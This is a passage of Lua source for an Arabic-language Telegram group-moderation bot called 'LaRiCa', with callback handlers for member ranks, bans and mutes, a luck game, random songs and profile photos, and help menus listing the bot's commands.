if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(LaRiCa.."LaRiCa:Addictive:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."LaRiCa:Addictive:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."LaRiCa:Addictive:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusDistinguishedz/(%d+)') and data.Admin then
local UserId = {Text:match('(%d+)/statusDistinguishedz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(LaRiCa.."LaRiCa:Distinguished:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."LaRiCa:Distinguished:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."LaRiCa:Distinguished:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusmem/(%d+)') and data.owner then
local UserId ={ Text:match('(%d+)/statusmem/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:srem(LaRiCa.."LaRiCa:Distinguished:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."LaRiCa:Addictive:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."LaRiCa:Managers:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."LaRiCa:Originators:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."LaRiCa:TheBasics:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."LaRiCa:SilentGroup:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."LaRiCa:BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'restricted',{1,1,1,1,1,1,1,1,1})
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusban/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/statusban/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusCanOrNotCan(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id,"\n•عذرآ لا تستطيع استخدام الامر على ( "..Controller(ChatId,UserId[2]).." } ", true)
end
if Redis:sismember(LaRiCa.."LaRiCa:BanGroup:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."LaRiCa:BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'restricted',{1,1,1,1,1,1,1,1,1})
else
Redis:sadd(LaRiCa.."LaRiCa:BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'banned',0)
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusktm/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/statusktm/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusSilent(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id, "\n•عذرآ لا تستطيع استخدام الامر على ( "..Controller(ChatId,UserId[2]).." } ", true)
end
if Redis:sismember(LaRiCa.."LaRiCa:SilentGroup:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."LaRiCa:SilentGroup:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."LaRiCa:SilentGroup:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('/delAmr1') then
local UserId = Text:match('/delAmr1')
if data.Admin then
return LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
end
end
if Text and Text:match('/Mahibes(%d+)') then
local GetMahibes = Text:match('/Mahibes(%d+)') 
local NumMahibes = math.random(1,6)
if tonumber(GetMahibes) == tonumber(NumMahibes) then
Redis:incrby(LaRiCa.."Num:Add:Games"..ChatId..IdUser, 1)  
MahibesText = '*• الف مبروك حظك حلو اليوم\n• فزت ويانه وطلعت المحيبس بل عظمه رقم {'..NumMahibes..'}*'
else
MahibesText = '*• للاسف لقد خسرت المحيبس بالعظمه رقم {'..NumMahibes..'}\n• جرب حضك ويانه مره اخره*'
end
if NumMahibes == 1 then
Mahibes1 = '🤚' else Mahibes1 = '👊'
end
if NumMahibes == 2 then
Mahibes2 = '🤚' else Mahibes2 = '👊'
end
if NumMahibes == 3 then
Mahibes3 = '🤚' else Mahibes3 = '👊' 
end
if NumMahibes == 4 then
Mahibes4 = '🤚' else Mahibes4 = '👊'
end
if NumMahibes == 5 then
Mahibes5 = '🤚' else Mahibes5 = '👊'
end
if NumMahibes == 6 then
Mahibes6 = '🤚' else Mahibes6 = '👊'
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = '𝟏 » { '..Mahibes1..' }', data = '/*'}, {text = '𝟐 » { '..Mahibes2..' }', data = '/*'}, },
{{text = '𝟑 » { '..Mahibes3..' }', data = '/*'}, {text = '𝟒 » { '..Mahibes4..' }', data = '/*'}, },
{{text = '𝟓 » { '..Mahibes5..' }', data = '/*'}, {text = '𝟔 » { '..Mahibes6..' }', data = '/*'}, },
{{text = '{ اللعب مره اخرى }', data = '/MahibesAgane'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,MahibesText, 'md', true, false, reply_markup)
end
if Text == "/MahibesAgane" then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = '𝟏 » 👊', data = '/Mahibes1'}, {text = '𝟐 » 👊 ', data = '/Mahibes2'}, },
{{text = '𝟑 » 👊 ', data = '/Mahibes3'}, {text = '𝟒 » 👊 ', data = '/Mahibes4'}, },
{{text = '𝟓 » 👊 ', data = '/Mahibes5'}, {text = '𝟔 » 👊 ', data = '/Mahibes6'}, },}}
local TextMahibesAgane = [[*
• لعبة المحيبس هي لعبة الحظ 
• جرب حظك ويه البوت واتونس 
• كل ما عليك هوا الضغط على احدى العضمات في الازرار
*]]
return LuaTele.editMessageText(ChatId,Msg_id,TextMahibesAgane, 'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/chengreplyg') then
local listYt = Text:match('(%d+)/chengreplyg')
if tonumber(listYt) == tonumber(IdUser) then
Redis:set(LaRiCa.."Set:Manager:rd"..IdUser..":"..ChatId,"true")
LuaTele.editMessageText(ChatId,Msg_id,"• ارسل لي الرد الان", 'md', true)
end
end

if Text and Text:match('(%d+)/intq/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/intq/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusSilent(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id, "\n•عذرآ لا تستطيع استخدام الامر على ( "..Controller(ChatId,UserId[2]).." } ", true)
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 'https://t.me/LaRiCaTeam'}, },}}
LuaTele.setChatMemberStatus(ChatId,UserId[2],'restricted',{1,0,0,0,0,0,0,0,0})
return LuaTele.editMessageText(ChatId,Msg_id,"• تم تنفيذ عقوبة التقييد علي العضو", 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/inktm/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/inktm/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusSilent(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id, "\n•عذرآ لا تستطيع استخدام الامر على ( "..Controller(ChatId,UserId[2]).." } ", true)
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 'https://t.me/LaRiCaTeam'}, },}}
if Redis:sismember(LaRiCa.."SilentGroup:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."SilentGroup:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."SilentGroup:Group"..ChatId,UserId[2])
end
LuaTele.editMessageText(ChatId,Msg_id,"• تم تنفيذ عقوبة الكتم علي العضو", 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/inhzr/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/inhzr/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusCanOrNotCan(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id, "\n•عذرآ لا تستطيع استخدام الامر على ( "..Controller(ChatId,UserId[2]).." } ", true)
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 'https://t.me/LaRiCaTeam'}, },}}
if Redis:sismember(LaRiCa.."BanGroup:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'restricted',{1,1,1,1,1,1,1,1,1})
else
Redis:sadd(LaRiCa.."BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'banned',0)
end
LuaTele.editMessageText(ChatId,Msg_id,"• تم تنفيذ عقوبة الحظر علي العضو", 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/cancelrdd') then
local UserId = Text:match('(%d+)/cancelrdd')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 'https://t.me/LaRiCaTeam'}, },}}
Redis:del(LaRiCa.."Set:array:Ssd"..IdUser..":"..ChatId)
Redis:del(LaRiCa.."Set:array:rd"..IdUser..":"..ChatId)
Redis:del(LaRiCa.."Set:array"..IdUser..":"..ChatId)
Redis:del(LaRiCa.."Set:Manager:rd"..IdUser..":"..ChatId)
Redis:del(LaRiCa.."Set:Manager:rd"..IdUser..":"..ChatId)
Redis:del(LaRiCa.."Set:Rd"..IdUser..":"..ChatId)
Redis:del(LaRiCa.."Set:On"..IdUser..":"..ChatId)
LuaTele.editMessageText(ChatId,Msg_id,"تم الغاء الامر بنجاح", 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/songg') then
local UserId = Text:match('(%d+)/songg')
if tonumber(IdUser) == tonumber(UserId) then
Num = math.random(8,83)
Mhm = math.random(108,143)
Mhhm = math.random(166,179)
Mmhm = math.random(198,216)
Mhmm = math.random(257,626)
local Texting = {Num,Mhm,Mhhm,Mmhm,Mhmm}
local Rrr = Texting[math.random(#Texting)]
au ={type = "audio",media = "https://t.me/pvv_v/"..Rrr.."",caption = '• اليك اغنيه عشوائيه من البوت\n',parse_mode = "Markdown"}     
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'مره اخرى', callback_data=IdUser.."/songg"},},}
local mm = Msg_id/2097152/0.5
https.request("http://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..ChatId.."&message_id="..mm.."&media="..JSON.encode(au).."&reply_markup="..JSON.encode(keyboard))
end 
end
if Text and Text:match('(%d+)/sorty2') then
local UserId = Text:match('(%d+)/sorty2')
if tonumber(IdUser) == tonumber(UserId) then
local photo = LuaTele.getUserProfilePhotos(IdUser)
local ph = photo.photos[2].sizes[#photo.photos[1].sizes].photo.remote.id
pph ={type = "photo",media = ph,caption = '• عدد صورك هو '..photo.total_count..'\n• وهذه صورتك رقم 2\n',parse_mode = "Markdown"}     
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'صورتك التاليه', callback_data=IdUser.."/sorty3"},{text = 'صورتك السابقه', callback_data=IdUser.."/sorty1"},},}
local mm = Msg_id/2097152/0.5
https.request("http://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..ChatId.."&message_id="..mm.."&media="..JSON.encode(pph).."&reply_markup="..JSON.encode(keyboard))
end 
end
if Text and Text:match('(%d+)/sorty3') then
local UserId = Text:match('(%d+)/sorty3') 
if tonumber(IdUser) == tonumber(UserId) then
local photo = LuaTele.getUserProfilePhotos(UserId)
local ph = photo.photos[3].sizes[#photo.photos[1].sizes].photo.remote.id
local pph ={type = "photo",media = ph,caption = '• عدد صورك هو '..photo.total_count..'\n• وهذه صورتك رقم 3\n',parse_mode = "Markdown"}
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'صورتك التاليه', callback_data=IdUser.."/sorty4"},{text = 'صورتك السابقه', callback_data=IdUser.."/sorty2"},},}
local mm = Msg_id/2097152/0.5
https.request("http://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..ChatId.."&message_id="..mm.."&media="..JSON.encode(pph).."&reply_markup="..JSON.encode(keyboard))
end 
end
if Text and Text:match('(%d+)/sorty1') then
local UserId = Text:match('(%d+)/sorty1')
if tonumber(IdUser) == tonumber(UserId) then
local photo = LuaTele.getUserProfilePhotos(IdUser)
local ph = photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id
local pph ={type = "photo",media = ph,caption = '• عدد صورك هو '..photo.total_count..'\n• وهذه صورتك رقم 1\n',parse_mode = "Markdown"}
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'صورتك التاليه', callback_data=IdUser.."/sorty2"},},}
local mm = Msg_id/2097152/0.5
https.request("http://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..ChatId.."&message_id="..mm.."&media="..JSON.encode(pph).."&reply_markup="..JSON.encode(keyboard))
end 
end
if Text and Text:match('(%d+)/sorty4') then
local UserId = Text:match('(%d+)/sorty4')
if tonumber(IdUser) == tonumber(UserId) then
local photo = LuaTele.getUserProfilePhotos(IdUser)
local ph = photo.photos[4].sizes[#photo.photos[1].sizes].photo.remote.id
local pph ={type = "photo",media = ph,caption = '• عدد صورك هو '..photo.total_count..'\n• وهذه صورتك رقم 4\n',parse_mode = "Markdown"}
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'صورتك التاليه', callback_data=IdUser.."/sorty5"},{text = 'صورتك السابقه', callback_data=IdUser.."/sorty3"},},}
local mm = Msg_id/2097152/0.5
https.request("http://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..ChatId.."&message_id="..mm.."&media="..JSON.encode(pph).."&reply_markup="..JSON.encode(keyboard))
end 
end
if Text and Text:match('(%d+)/sorty5') then
local UserId = Text:match('(%d+)/sorty5')
if tonumber(IdUser) == tonumber(UserId) then
local photo = LuaTele.getUserProfilePhotos(IdUser)
local ph = photo.photos[5].sizes[#photo.photos[5].sizes].photo.remote.id
local pph ={type = "photo",media = ph,caption = '• عدد صورك هو '..photo.total_count..'\n• وهذه صورتك رقم 5\n',parse_mode = "Markdown"}
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'صورتك السابقه', callback_data=IdUser.."/sorty4"},},}
local mm = Msg_id/2097152/0.5
https.request("http://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..ChatId.."&message_id="..mm.."&media="..JSON.encode(pph).."&reply_markup="..JSON.encode(keyboard))
end 
end
if Text == 'EndAddarray'..IdUser then  
if Redis:get(LaRiCa..'Set:array'..IdUser..':'..ChatId) == 'true1' then
Redis:del(LaRiCa..'Set:array'..IdUser..':'..ChatId)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sᴏᴜʀᴄʀ LaRiCa',url='http://t.me/LaRiCaTeam'}},
}
local msg_idd = Msg_id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatId..'&text='..URL.escape("*• تم حفظ الردود بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'sᴏᴜʀᴄʀ LaRiCa',url='http://t.me/LaRiCaTeam'}},}
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatId..'&text='..URL.escape("*• تم تنفيذ الامر سابقا*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(%d+)/help1') then
local UserId = Text:match('(%d+)/help1')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '٬ ¹ ٫', data = IdUser..'/help2'},},
{{text = '٬ ² ٫', data = IdUser..'/help3'}, {text = '٬ ³ ٫', data = IdUser..'/help4'},},
{{text = '٬ ⁴ ٫', data = IdUser..'/help5'}, {text = '٬ ⁵ ٫', data = IdUser..'/help7'},},
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, },}}
local TextHelp = [[*
• (اوامر الحمايه)  اتبع مايلي ...
ٴ— — — — — — — — — —
• قفل ، فتح ← الامر 
• تستطيع قفل حمايه كما يلي ...
• ← بالتقييد ، بالطرد ، بالكتم 
ٴ— — — — — — — — — —
• الروابط
• المعرف
• التاك
• الشارحه
• التعديل
• التثبيت
• المتحركه
• الملفات
• الصور
ٴ— — — — — — — — — —
• الماركداون
• البوتات
• التكرار
• الكلايش
• السيلفي
• الملصقات
• الفيديو
• الانلاين
• الدردشه
ٴ— — — — — — — — — —
• القناه
• التوجيه
• الاغاني
• الصوت
• الجهات
• الاشعارات
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help2') then
local UserId = Text:match('(%d+)/help2')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '٬ ⁰ ٫', data = IdUser..'/help1'},},
{{text = '٬ ² ٫', data = IdUser..'/help3'}, {text = '٬ ³ ٫', data = IdUser..'/help4'},},
{{text = '٬ ⁴ ٫', data = IdUser..'/help5'}, {text = '٬ ⁵ ٫', data = IdUser..'/help7'},},
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'},},}}
local TextHelp = [[*
• اوامر ادمنية الكروب ...
ٴ— — — — — — — — — —
• رفع، تنزيل ← مميز
• تاك للكل ، عدد الكروب
• كتم ، حظر ، طرد ، تقييد
• الغاء كتم ، الغاء حظر ، الغاء تقييد
• منع ، الغاء منع 
ٴ— — — — — — — — — —
• عرض القوائم كما يلي ...
ٴ— — — — — — — — — —
• المكتومين
• المميزين 
• قائمه المنع
ٴ— — — — — — — — — —
• تثبيت ، الغاء تثبيت
• الرابط ، الاعدادات
• الترحيب ، القوانين
• تفعيل ، تعطيل ← الترحيب
• تفعيل ، تعطيل ← الرابط
• جهاتي ،ايدي ، رسائلي
• تعديلاتي ، نقاطي
• كشف البوتات
ٴ— — — — — — — — — —
• وضع ، ضع ← الاوامر التاليه 
• اسم ، رابط ، صوره
• قوانين ، وصف ، ترحيب
ٴ— — — — — — — — — —
• حذف ، مسح ← الاوامر التاليه
• قائمه المنع ، المحظورين 
• المميزين ، المكتومين ، القوانين
• المطرودين ، البوتات ، الصوره
• الرابط
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/setallmember') then
local UserId = Text:match('(%d+)/setallmember')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = 'عوده', data = IdUser..'/chback'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'},},}}
local TextHelp = [[*
• تم تفعيل وضع الاشتراك الاجباري لكل الاعضاء
*]]
Redis:set(LaRiCa.."chmembers","on")
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/setforcmd') then
local UserId = Text:match('(%d+)/setforcmd')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = 'عوده', data = IdUser..'/chback'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'},},}}
local TextHelp = [[*
• تم تفعيل وضع الاشتراك الاجباري علي اوامر البوت فقط مثل (الحظر/الكتم الخ..)
*]]
Redis:del(LaRiCa.."chmembers")
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/chback') then
local UserId = Text:match('(%d+)/chback')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {{{text = '1', data = IdUser..'/setallmember'},{text = '2', data = IdUser..'/setforcmd'},},}}
local TextHelp = '• اختار كيف تريد تفعيله \n• 1 : وضع الاشتراك الاجباري لكل الاعضاء \n• 2 : وضع الاشتراك الاجباري عند استخدام الاوامر فقط \n'
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help3') then
local UserId = Text:match('(%d+)/help3')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '٬ ⁰ ٫', data = IdUser..'/help1'}, {text = '٬ ¹ ٫', data = IdUser..'/help2'}, },
{{text = '٬ ³ ٫', data = IdUser..'/help4'}, },
{{text = '٬ ⁴ ٫', data = IdUser..'/help5'}, {text = '٬ ⁵ ٫', data = IdUser..'/help7'},},
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'},},}}
local TextHelp = [[*
•( اوامر المدراء)  في الكروب
ٴ— — — — — — — — — —
• رفع ، تنزيل ← ادمن
• الادمنيه 
• رفع، كشف ← القيود
• تنزيل الكل ← بالرد ، بالمعرف
ٴ— — — — — — — — — —
• لتغيير رد الرتب في البوت
ٴ— — — — — — — — — —
• تغيير رد ← اسم الرتبه والنص
• المطور ، المنشئ الاساسي
• المنشئ ، المدير ، الادمن
• المميز ، العضو
ٴ— — — — — — — — — —
• تفعيل ، تعطيل ← الاوامر التاليه ↓
ٴ— — — — — — — — — —
• الايدي ، الايدي بالصوره
• الردود العامه ، الردود
• اطردني ، الالعاب ، الرفع
• الحظر ، الرابط 
ٴ— — — — — — — — — —
• تعين ، مسح ←الايدي 
• رفع الادمنيه ، مسح الادمنيه
• الردود ، مسح الردود
• اضف ، حذف ←  رد 
• مسح ← عدد 
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help4') then
local UserId = Text:match('(%d+)/help4')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '٬ ⁰ ٫', data = IdUser..'/help1'}, {text = '٬ ¹ ٫', data = IdUser..'/help2'}, },
{{text = '٬ ² ٫', data = IdUser..'/help3'}, },
{{text = '٬ ⁴ ٫', data = IdUser..'/help5'}, {text = '٬ ⁵ ٫', data = IdUser..'/help7'}, },
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, },}}
local TextHelp = [[*
• اوامر المنشئ الاساسي
ٴ— — — — — — — — — —
• رفع ، تنزيل ← منشئ 
• المنشئين ، مسح المنشئين
ٴ— — — — — — — — — —
• اوامر المنشئ الكروب
ٴ— — — — — — — — — —
• رفع ، تنزيل ←  مدير
• المدراء ، مسح المدراء
• اضف رسائل ←  بالرد او الايدي
• اضف نقاط ←  بالرد او الايدي
• اضف ، حذف ← امر
• الاوامر المضافه ، مسح الاوامر المضافه
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help5') then
local UserId = Text:match('(%d+)/help5')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '٬ ⁰ ٫', data = IdUser..'/help1'}, {text = '٬ ¹ ٫', data = IdUser..'/help2'}, },
{{text = '٬ ² ٫', data = IdUser..'/help3'}, {text = '٬ ³ ٫', data = IdUser..'/help4'}, },
{{text = '٬ ⁵ ٫', data = IdUser..'/help7'}, },
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, },}}
local TextHelp = [[*
• اوامر المطور الاساسي
ٴ— — — — — — — — — —
• حظر عام ، الغاء العام
• اضف ، حذف ← مطور
• قائمه العام ، مسح قائمه العام
• المطورين ، مسح المطورين
ٴ— — — — — — — — — —
• اضف ، حذف ←  رد عام 
• وضع ، حذف ← كليشه المطور
• مسح الردود العامه ، الردود العامه
• تعين عدد الاعضاء ← العدد
• تحديث
ٴ— — — — — — — — — —
• تفعيل ، تعطيل ←  الاوامر التاليه ↓
• البوت الخدمي ، المغادرة ، الاذاعه
ٴ— — — — — — — — — —
• اوامر المطور في البوت
ٴ— — — — — — — — — —
• تفعيل ، تعطيل ، الاحصائيات
• رفع، تنزيل ← منشئ اساسي
• رفع، تنزيل ← مالك
• مسح الاساسين ، المنشئين الاساسين
• غادر ← الايدي
• اذاعه ، اذاعه بالتوجيه ، اذاعه بالتثبيت
• اذاعه خاص ، اذاعه خاص بالتوجيه
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help7') then
local UserId = Text:match('(%d+)/help7')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = '٬ ⁰ ٫', data = IdUser..'/help1'}, {text = '٬ ¹ ٫', data = IdUser..'/help2'}, },
{{text = '٬ ² ٫', data = IdUser..'/help3'}, {text = '٬ ³ ٫', data = IdUser..'/help4'}, },
{{text = '٬ ⁴ ٫', data = IdUser..'/help5'}, },
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, },}}
local TextHelp = [[*
• اوامر التسلية
ٴ— — — — — — — — — —
• رفع ، تنزيل ← الاوامر التاليه ↓
ٴ— — — — — — — — — —
• غبي 
• نثيه
• حمار
• فرخ
• قرد 
• فرخي
• متوحد
• متوحده
• جلب 
ٴ— — — — — — — — — —
• اوامر التاك 
ٴ— — — — — — — — — —
• الاغبياء
• الحمير
• الفرخات
• النثيه
• المتوحدين
• الجلاب
• اولادي
• القرود
ٴ— — — — — — — — — —
• اوامر الترفيه 
ٴ— — — — — — — — — —
• زخرفه + النص
• مثال زخرفه سونيك
• احسب + عمرك
• مثال احسب 2001/8/5
• معني + الاسم
• مثال معني ملاذ
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/help6') then
local UserId = Text:match('(%d+)/help6')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
{{text = 'العاب السورس ™️', data = IdUser..'/normgm'}, {text = 'العاب متطورة 🎳', data = IdUser..'/degm'}, },
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, },
}}
local TextHelp = [[*
• أهلا بك في قائمة العاب 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. اختر نوع الالعاب 
*]]
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/degm') then
local UserId = Text:match('(%d+)/degm')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',data = {
	{{text = '- فلابي بيرد', url = 'http://t.me/awesomebot?game=FlappyBird'}, },
{{text = '- تبديل النجوم ', url = 'http://t.me/gamee?game=Switchy'}, {text = '- موتسيكلات', url = 'http://t.me/gamee?game=motofx'}, },
{{text = '- اطلاق النار ', url = 'http://t.me/gamee?game=NeonBlaster'}, {text = '- كره القدم', url = 'http://t.me/gamee?game=Footballstar'}, },
{{text = '- تجميع الوان ', url = 'http://t.me/awesomebot?game=Hextris'}, {text = '- المجوهرات', url = 'http://t.me/gamee?game=DiamondRows'}, },
{{text = '- ركل الكرة ', url = 'http://t.me/gamee?game=KeepitUP'}, {text = '- بطولة السحق', url = 'http://t.me/gamee?game=SmashRoyale'}, },
{{text = '- 2048', url = 'http://t.me/awesomebot?game=g2048'}, },
{{text = '- كرة السلة ', url = 'http://t.me/gamee?game=BasketBoy'}, {text = '- القط المجنون', url = 'http://t.me/gamee?game=CrazyCat'}, },
{{text = '٬ 𝗆𝖺𝗂𝗇 𝗅𝗂𝗌𝗍  ٫', data = IdUser..'/helpall'},},
{{text = '٬ 𝙇𝙖𝙍𝙞𝙘𝙖 † ٫', url = 't.me/LaRiCaTeam'}, },}}
local TextHelp = [[*
